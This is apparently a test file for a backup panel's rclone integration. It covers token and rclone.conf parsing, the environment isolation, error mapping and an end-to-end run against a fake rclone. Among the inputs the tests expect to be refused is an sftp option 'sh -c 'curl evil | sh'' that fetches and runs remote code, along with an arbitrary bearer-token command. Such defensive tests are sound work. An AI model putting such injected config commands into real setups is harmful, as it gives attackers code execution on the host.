import { createReporter } from "../harness.mjs";
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { loadTs } from "../ts-modules.mjs";

/**
 * The rclone destination, without rclone.
 *
 * rclone is not installed here, so what is checked is everything the panel
 * builds and reads: the token pasted from `rclone authorize` (every shape it
 * comes in), the pasted `rclone.conf` sections and the options refused in
 * them, the environment rclone runs with (the remote in variables, the config
 * in memory, nothing inherited), the command lines, every message mapped to a
 * plain cause, and the OneDrive drive lookup. Then the destination end to end
 * with tests/rclone-fake.mjs where rclone would be.
 *
 * When rclone IS on the PATH, the same end-to-end run is repeated with the
 * real program on a `local` remote (a pasted section, as an expert would).
 */
export const meta = { name: "backup-rclone-unit", needsDocker: false, drivers: [], standalone: true };

const HERE = dirname(fileURLToPath(import.meta.url));
const TOKEN = { access_token: "ya29.accesso-segreto-1234567890", token_type: "Bearer", refresh_token: "1//rinnovo-segreto-0987654321", expiry: "2026-11-18T12:00:00.000+01:00" };

async function collect(stream) {
  const parts = [];
  for await (const part of stream) parts.push(part);
  return Buffer.concat(parts);
}

async function rejects(promise) {
  try {
    await promise;
    return null;
  } catch (err) {
    return err;
  }
}

export async function run({ repoRoot }) {
  const r = createReporter("backup-rclone-unit");
  const cfg = await loadTs(repoRoot, "lib", "rclone-config.ts");
  const errors = await loadTs(repoRoot, "services", "backup", "destinations", "rclone-errors.ts");
  const rclone = await loadTs(repoRoot, "services", "backup", "destinations", "rclone.ts");
  const { DestinationFailure } = await loadTs(repoRoot, "services", "backup", "destinations", "problem.ts");
  const { whichSync } = await loadTs(repoRoot, "services", "toolchain.ts");

  // --- the token from rclone authorize -----------------------------------------------
  {
    const json = JSON.stringify(TOKEN);
    const plain = cfg.parseRcloneToken(json);
    r.check("a token pasted as JSON", plain.token && JSON.parse(plain.token).refresh_token === TOKEN.refresh_token);
    const terminal = cfg.parseRcloneToken(`2026/11/18 10:00:00 NOTICE: Got code\nPaste the following into your remote machine --->\n${json}\n<---End paste\n`);
    r.check("the whole terminal output", terminal.token === plain.token);
    const wrapped = Buffer.from(JSON.stringify({ token: json })).toString("base64");
    const newer = cfg.parseRcloneToken(`Paste the following into your remote machine --->\n${wrapped}\n<---End paste`);
    r.check("the base64 form newer versions print", newer.token === plain.token, JSON.stringify(newer));
    const pretty = cfg.parseRcloneToken(JSON.stringify(TOKEN, null, 2));
    r.check("pretty-printed JSON is made compact", pretty.token === plain.token);
    r.check("no refresh token is refused: it would die within the hour", "error" in cfg.parseRcloneToken(JSON.stringify({ ...TOKEN, refresh_token: undefined })));
    r.check("no access token is refused", "error" in cfg.parseRcloneToken(JSON.stringify({ refresh_token: "x" })));
    r.check("garbage is refused", "error" in cfg.parseRcloneToken("ciao") && "error" in cfg.parseRcloneToken(""));
    r.check("the access token is read back for the OneDrive lookup", cfg.accessTokenOf(plain.token) === TOKEN.access_token);
  }

  // --- pasted rclone.conf sections ----------------------------------------------------
  {
    const one = cfg.parseRcloneSections("# il mio drive\n[gdrive]\ntype = drive\nscope = drive\nclient_secret = abc==\n");
    r.check("a section is read", one.sections?.length === 1 && one.sections[0].name === "gdrive" && one.sections[0].options.type === "drive");
    r.check("a value with = in it is kept whole", one.sections[0].options.client_secret === "abc==");
    const two = cfg.parseRcloneSections("[nas]\ntype = sftp\nhost = nas.lan\nuser = backup\n\n[nas-crypt]\ntype = crypt\nremote = nas:archivi\npassword = segreto-offuscato\n");
    r.check("several sections, in order", two.sections?.map((s) => s.name).join(",") === "nas,nas-crypt");
    const bare = cfg.parseRcloneSections("type = mega\nuser = io@example.com\n");
    r.check("lines without a header are a remote called runpanel", bare.sections?.[0].name === "runpanel");
    for (const [label, text] of [
      ["no type", "[x]\nhost = a\n"],
      ["a name that starts with -", "[-x]\ntype = drive\n"],
      ["the sftp backend's external ssh command", "[x]\ntype = sftp\nssh = sh -c 'curl evil | sh'\n"],
      ["a bearer token command", "[x]\ntype = webdav\nbearer_token_command = /bin/evil\n"],
      ["two names rclone would read as one", "[a-b]\ntype = drive\n[a_b]\ntype = drive\n"],
      ["a line that is not key = value", "[x]\ntype = drive\nnonsense\n"],
      ["a type that is not a word", "[x]\ntype = dri ve\n"],
    ]) {
      r.check(`refused: ${label}`, "error" in cfg.parseRcloneSections(text), JSON.stringify(cfg.parseRcloneSections(text)));
    }
    r.check("the variable name upper-cases and turns - into _", cfg.rcloneEnvName("nas-crypt", "client_id") === "RCLONE_CONFIG_NAS_CRYPT_CLIENT_ID");
  }

  // --- the environment -----------------------------------------------------------------
  {
    const token = JSON.stringify(TOKEN);
    const drive = cfg.rcloneRemoteEnv({ provider: "drive", token, folder: "x" });
    r.check("Google Drive: a remote called runpanel, scope drive, the token in a variable", drive.remote === "runpanel" && drive.env.RCLONE_CONFIG_RUNPANEL_TYPE === "drive" && drive.env.RCLONE_CONFIG_RUNPANEL_SCOPE === "drive" && drive.env.RCLONE_CONFIG_RUNPANEL_TOKEN === token);
    r.check("OneDrive needs its drive", "error" in cfg.rcloneRemoteEnv({ provider: "onedrive", token, folder: "" }));
    const onedrive = cfg.rcloneRemoteEnv({ provider: "onedrive", token, driveId: "b!abc", driveType: "personal", folder: "" });
    r.check("and gets it as variables", onedrive.env.RCLONE_CONFIG_RUNPANEL_DRIVE_ID === "b!abc" && onedrive.env.RCLONE_CONFIG_RUNPANEL_DRIVE_TYPE === "personal");
    const expert = cfg.rcloneRemoteEnv({ provider: "expert", sections: "[nas]\ntype = sftp\nhost = nas.lan\n[nas-crypt]\ntype = crypt\nremote = nas:archivi\n", remote: "nas-crypt", folder: "" });
    r.check("expert: every section, under its own name", expert.remote === "nas-crypt" && expert.env.RCLONE_CONFIG_NAS_HOST === "nas.lan" && expert.env.RCLONE_CONFIG_NAS_CRYPT_REMOTE === "nas:archivi");
    r.check("expert: a remote that is not pasted is refused", "error" in cfg.rcloneRemoteEnv({ provider: "expert", sections: "[a]\ntype = drive\n", remote: "b", folder: "" }));
    const env = rclone.rcloneEnvironment(drive.env, { PATH: "/usr/bin", HOME: "/home/rp", RCLONE_CONFIG_EVIL_TYPE: "local", RCLONE_CONFIG: "/home/rp/.config/rclone/rclone.conf", HTTPS_PROXY: "http://proxy:3128", SECRET_OF_THE_PANEL: "x" });
    r.check("nothing RCLONE_ the panel inherited reaches rclone", env.RCLONE_CONFIG_EVIL_TYPE === undefined);
    r.check("the configuration stays in memory", env.RCLONE_CONFIG === (process.platform === "win32" ? "NUL" : "/dev/null"));
    r.check("the proxy settings do reach it, the rest of the panel's environment does not", env.HTTPS_PROXY === "http://proxy:3128" && env.SECRET_OF_THE_PANEL === undefined && env.HOME === "/home/rp");
    r.check("in the C locale", env.LC_ALL === "C");
    const args = rclone.rcloneArgs("copyto", ["/data/backups/staging/x.zip", cfg.rclonePath("runpanel", "-strano/x.zip")]);
    const end = args.indexOf("--");
    r.check("paths come after --", end > 0 && args[end + 1] === "/data/backups/staging/x.zip" && args.length === end + 3);
    r.check("a remote path can never be read as an option", args[end + 2] === "runpanel:-strano/x.zip");
    r.check("JSON log lines and no prompts", args.includes("--use-json-log") && args.includes("--ask-password=false"));
    r.check("the token is never on the command line", !args.join(" ").includes(TOKEN.access_token));
  }

  // --- versions and messages -------------------------------------------------------------
  {
    r.check("a version is read", errors.parseRcloneVersion("rclone v1.68.2\n- os/version: ubuntu")?.text === "1.68.2");
    r.check("a distribution's build too", errors.parseRcloneVersion("rclone v1.60.1-DEV")?.text === "1.60.1-DEV");
    r.check("1.53 is too old", errors.rcloneTooOld(errors.parseRcloneVersion("rclone v1.53.3-DEV")));
    r.check("1.60 is not", !errors.rcloneTooOld(errors.parseRcloneVersion("rclone v1.60.1")));
    const ctx = { service: "Google Drive", folder: "runpanel-backups", step: "upload", authorize: 'rclone authorize "drive"', secrets: [TOKEN.access_token, TOKEN.refresh_token] };
    const json = (msg) => JSON.stringify({ level: "error", msg, source: "x", time: "t" });
    const said = (stderr, exitCode = 1, extra = {}) => errors.describeRcloneFailure({ exitCode, stderr }, { ...ctx, ...extra });
    const cases = [
      [json('Failed to create file system for "runpanel:": couldn\'t fetch token - maybe it has expired?: oauth2: cannot fetch token: 400 Bad Request Response: {"error":"invalid_grant"}'), "TOKEN_REVOKED"],
      [json("Failed to copy: googleapi: Error 403: The user's Drive storage quota has been exceeded., storageQuotaExceeded"), "QUOTA"],
      [json("Failed to copy: upload failed: insufficient_space/.."), "QUOTA"],
      [json("Failed to copy: quotaLimitReached: Insufficient Space"), "QUOTA"],
      [json("Failed to copy: googleapi: Error 403: User Rate Limit Exceeded., userRateLimitExceeded"), "RATE_LIMIT"],
      [json('Failed to create file system for "runpanel:": didn\'t find section in config file'), "CONFIG"],
      [json("Failed to create file system: unable to get drive_id and drive_type - if you are upgrading from older versions of rclone, please run `rclone config` and re-configure this backend"), "ONEDRIVE_DRIVE"],
      [json('Failed to copy: Post "https://www.googleapis.com/upload": dial tcp: lookup www.googleapis.com on 127.0.0.53:53: no such host'), "DNS"],
      [json("Failed to copy: context deadline exceeded"), "TIMEOUT"],
      [json("Failed to copy: x509: certificate signed by unknown authority"), "TLS"],
      ["Error: unknown flag: --use-json-log", "RCLONE_TOO_OLD"],
      [json("Failed to copy: googleapi: Error 403: Insufficient Permission, insufficientPermissions"), "PERMISSION"],
    ];
    for (const [stderr, code] of cases) {
      const p = said(stderr);
      r.check(`rclone → ${code}: ${stderr.slice(0, 60)}…`, p.code === code, `${p.code}: ${p.cause}`);
    }
    const revoked = said(json("couldn't fetch token: invalid_grant"));
    r.check("a revoked token says how to make a new one", revoked.fix.includes('rclone authorize "drive"'), revoked.fix);
    r.check("a missing archive on a download", said(json("Failed to cat: directory not found"), 3, { step: "download" }).code === "NOT_FOUND");
    const missing = errors.describeRcloneFailure({ exitCode: null, stderr: "", spawnError: Object.assign(new Error("spawn rclone ENOENT"), { code: "ENOENT" }) }, ctx);
    r.check("no rclone: how to install it, by the operator", missing.code === "RCLONE_MISSING" && /rclone\.org\/install\.sh/.test(missing.fix) && /non installa niente/.test(missing.fix));
    const leaky = said(json(`Failed to copy: refresh failed with token ${TOKEN.refresh_token} and ${TOKEN.access_token}`));
    r.check("a token rclone prints is masked in the detail", !(leaky.detail ?? "").includes(TOKEN.refresh_token) && !(leaky.detail ?? "").includes(TOKEN.access_token) && !leaky.cause.includes(TOKEN.access_token), leaky.detail);
    r.check("the JSON wrapping does not reach the detail", !(said(json("boom")).detail ?? "").includes('"level"'));
  }

  // --- the OneDrive lookup ------------------------------------------------------------------
  {
    const token = JSON.stringify(TOKEN);
    let seen = null;
    const ok = await rclone.lookupOneDrive(token, async (url, init) => {
      seen = { url, auth: init.headers.authorization };
      return new Response(JSON.stringify({ id: "b!drive", driveType: "business" }), { status: 200 });
    });
    r.check("the drive is asked of Graph with the access token", ok.driveId === "b!drive" && ok.driveType === "business" && seen.url.endsWith("/me/drive") && seen.auth === `Bearer ${TOKEN.access_token}`);
    const expired = await rclone.lookupOneDrive(token, async () => new Response("{}", { status: 401 }));
    r.check("an expired paste is said to be expired", /scaduto/.test(expired.error ?? ""));
    const offline = await rclone.lookupOneDrive(token, async () => {
      throw new TypeError("fetch failed");
    });
    r.check("no connection is said as such", /raggiungere Microsoft/.test(offline.error ?? ""));
    const odd = await rclone.lookupOneDrive(token, async () => new Response(JSON.stringify({ id: "x", driveType: "boh" }), { status: 200 }));
    r.check("an unknown drive type is refused", "error" in odd);
  }

  // --- the destination, end to end ---------------------------------------------------------------
  const scratch = fs.mkdtempSync(join(os.tmpdir(), "rp-rclone-unit-"));
  const savedEnv = { ...process.env };
  try {
    const root = join(scratch, "remote");
    const tmpDir = join(scratch, "tmp");
    fs.mkdirSync(root, { recursive: true });
    const record = join(scratch, "record.jsonl");
    const settings = join(scratch, "fake-settings.json");
    const fake = { file: process.execPath, args: [join(HERE, "..", "rclone-fake.mjs"), settings] };
    // A variable of the panel's own that must never reach rclone.
    process.env.RCLONE_CONFIG_EVIL_TYPE = "local";
    const setEnv = (extra = {}) => {
      fs.writeFileSync(settings, JSON.stringify({ root, record, ...extra }));
    };
    const token = JSON.stringify(TOKEN);
    const destination = (config = {}, command = fake) =>
      rclone.rcloneDestination({ id: "r1", name: "Drive", type: "rclone" }, { provider: "drive", token, folder: "RunPanel/notte 'n' giorno", ...config }, { tmpDir, command });

    // --- where it writes, for a policy that refuses two copies in one place ----------
    const otherToken = JSON.stringify({ ...TOKEN, refresh_token: "1//un-altro-account-111111" });
    r.check("the same authorization and folder is the same place", destination().location() === destination().location());
    r.check("another account is another place", destination().location() !== destination({ token: otherToken }).location());
    r.check("another folder too", destination().location() !== destination({ folder: "Altro" }).location());
    r.check("and the place never spells the token out", !destination().location().includes(TOKEN.refresh_token));
    r.check(
      "OneDrive is told by its drive",
      destination({ provider: "onedrive", driveId: "b!uno", driveType: "personal" }).location().includes("drive-b!uno")
    );
    let progressed = 0;
    rclone.statsProgress(JSON.stringify({ level: "notice", msg: "Transferred: 1 KiB / 5 KiB", stats: { bytes: 1234, totalBytes: 5000 } }), (done) => (progressed = done));
    rclone.statsProgress("Transferred: 2 KiB", () => (progressed = -1));
    r.check("rclone's JSON stats become progress, nothing else does", progressed === 1234);
    r.check(
      "and never a reason for a failure",
      errors.describeRcloneFailure({ exitCode: 1, stderr: `${JSON.stringify({ level: "notice", msg: "Transferred: 1 KiB", stats: { bytes: 1 } })}\n${JSON.stringify({ level: "error", msg: "Failed to copy: storageQuotaExceeded" })}` }, { service: "Google Drive", folder: "x", step: "upload", authorize: null, secrets: [] }).detail?.includes("Transferred") === false
    );

    setEnv();
    const check = await destination().test();
    r.check("Verifica passes and says the service and the version", check.ok === true && check.message.includes("Google Drive") && check.message.includes("rclone 1.68.2"), JSON.stringify(check));
    r.check("and leaves no probe behind, here or there", fs.readdirSync(tmpDir).length === 0 && fs.readdirSync(join(root, "RunPanel", "notte 'n' giorno")).length === 0);

    const archive = join(scratch, "archive.zip");
    const payload = crypto.randomBytes(1024 * 1024 + 33);
    fs.writeFileSync(archive, payload);
    const stored = await destination().put(archive, "runpanel-20261118-030000-notte-abc123.zip");
    r.check("put returns the path under the folder", stored.ref === "RunPanel/notte 'n' giorno/runpanel-20261118-030000-notte-abc123.zip" && stored.bytes === payload.length, JSON.stringify(stored));
    r.check("the remote has every byte", fs.readFileSync(join(root, "RunPanel", "notte 'n' giorno", "runpanel-20261118-030000-notte-abc123.zip")).equals(payload));
    const st = await destination().stat(stored.ref);
    r.check("stat reads the size with lsjson --stat", st.exists && st.bytes === payload.length, JSON.stringify(st));
    r.check("a missing archive is missing", (await destination().stat("RunPanel/nope.zip")).exists === false);
    const back = await collect(await destination().open(stored.ref));
    r.check("open streams it back with cat", back.equals(payload));
    const missingOpen = await rejects(destination().open("RunPanel/nope.zip"));
    r.check("opening a missing archive fails before any byte, with the reason", missingOpen instanceof DestinationFailure && missingOpen.problem.code === "NOT_FOUND", String(missingOpen));
    await destination().remove(stored.ref);
    r.check("remove deletes it", !fs.existsSync(join(root, "RunPanel", "notte 'n' giorno", "runpanel-20261118-030000-notte-abc123.zip")));
    await destination().remove(stored.ref);
    r.check("and removing it again is fine", true);

    const records = fs.readFileSync(record, "utf8").trim().split("\n").map((line) => JSON.parse(line));
    r.check("the token is never on a command line", records.every((entry) => !entry.args.join(" ").includes(TOKEN.access_token)));
    r.check("it arrives as a variable", records.filter((entry) => entry.args[0] !== "version").every((entry) => entry.envNames.includes("RCLONE_CONFIG_RUNPANEL_TOKEN")));
    r.check("the panel's own RCLONE_ variables never do", records.every((entry) => !entry.envNames.includes("RCLONE_CONFIG_EVIL_TYPE")));
    r.check("rclone keeps its configuration in memory", records.every((entry) => entry.rcloneConfig === (process.platform === "win32" ? "NUL" : "/dev/null")));

    setEnv({ mode: "revoked" });
    const revoked = await destination().test();
    r.check("a revoked token fails Verifica, saying how to make a new one", revoked.ok === false && revoked.code === "TOKEN_REVOKED" && revoked.message.includes('rclone authorize "drive"'), JSON.stringify(revoked));
    r.check("without the token in the message", !JSON.stringify(revoked).includes(TOKEN.refresh_token));

    setEnv({ mode: "quota" });
    const quota = await rejects(destination().put(archive, "q.zip"));
    r.check("a full account fails the backup with the reason", quota instanceof DestinationFailure && quota.problem.code === "QUOTA", String(quota));

    setEnv({ mode: "nodelete" });
    const noDelete = await destination().test();
    r.check("a folder where nothing can be deleted passes with a warning", noDelete.ok === true && noDelete.warning === true && /retention/.test(noDelete.message), JSON.stringify(noDelete));
    for (const name of fs.readdirSync(join(root, "RunPanel", "notte 'n' giorno"))) fs.rmSync(join(root, "RunPanel", "notte 'n' giorno", name));

    setEnv();
    await destination().put(archive, "t.zip");
    setEnv({ mode: "truncate-cat" });
    const truncated = await destination().open("RunPanel/notte 'n' giorno/t.zip");
    const cut = await rejects(collect(truncated));
    r.check("a cat cut halfway fails the stream instead of ending it short", cut instanceof DestinationFailure, String(cut));

    setEnv({ version: "1.53.3-DEV" });
    const old = await destination().test();
    r.check("a too old rclone is said with the version it found", old.ok === false && old.code === "RCLONE_TOO_OLD" && old.message.includes("1.53.3-DEV"), JSON.stringify(old));

    setEnv();
    const absent = await destination({}, { file: "runpanel-no-such-rclone", args: [] }).test();
    r.check("no rclone is said with how to install it", absent.ok === false && absent.code === "RCLONE_MISSING" && /install\.sh/.test(absent.message), JSON.stringify(absent));

    const expert = await rclone
      .rcloneDestination(
        { id: "r2", name: "NAS", type: "rclone" },
        { provider: "expert", sections: "[nas]\ntype = sftp\nhost = nas.lan\n[cifrato]\ntype = crypt\nremote = nas:x\n", remote: "cifrato", folder: "archivi" },
        { tmpDir, command: fake }
      )
      .test();
    r.check("an expert remote works under its own name", expert.ok === true && expert.message.includes("rclone («cifrato», crypt)"), JSON.stringify(expert));
    const expertRecord = fs.readFileSync(record, "utf8").trim().split("\n").map((line) => JSON.parse(line)).at(-1);
    r.check("with every section in the environment", expertRecord.envNames.includes("RCLONE_CONFIG_NAS_HOST") && expertRecord.envNames.includes("RCLONE_CONFIG_CIFRATO_REMOTE"));

    setEnv({ mode: "slow" });
    const controller = new AbortController();
    const started = Date.now();
    const pending = destination().put(archive, "slow.zip", { signal: controller.signal });
    setTimeout(() => controller.abort(), 300);
    const aborted = await rejects(pending);
    r.check("an upload can be cancelled, and stops rclone", aborted instanceof DestinationFailure && aborted.problem.code === "ABORTED" && Date.now() - started < 8000, aborted ? `${aborted.problem?.code} after ${Date.now() - started} ms` : "finished");

    // --- the real rclone, when there is one -------------------------------------------------------
    const real = whichSync("rclone");
    if (real) {
      setEnv();
      const localRoot = join(scratch, "real-remote");
      fs.mkdirSync(localRoot, { recursive: true });
      const realDestination = rclone.rcloneDestination(
        { id: "r3", name: "locale", type: "rclone" },
        { provider: "expert", sections: "[locale]\ntype = local\n", remote: "locale", folder: `${localRoot.split("\\").join("/")}/archivi con spazi` },
        { tmpDir }
      );
      const realCheck = await realDestination.test();
      r.check("real rclone: Verifica passes", realCheck.ok === true, JSON.stringify(realCheck));
      const realStored = await realDestination.put(archive, "reale.zip");
      r.check("real rclone: put", (await realDestination.stat(realStored.ref)).bytes === payload.length);
      r.check("real rclone: open", (await collect(await realDestination.open(realStored.ref))).equals(payload));
      await realDestination.remove(realStored.ref);
      r.check("real rclone: remove", (await realDestination.stat(realStored.ref)).exists === false);
    } else {
      r.note("rclone non installato: la prova end-to-end con il programma vero è saltata (gira quando rclone è nel PATH)");
    }
  } finally {
    for (const key of Object.keys(process.env)) if (!(key in savedEnv)) delete process.env[key];
    Object.assign(process.env, savedEnv);
    fs.rmSync(scratch, { recursive: true, force: true });
  }

  return r.result();
}
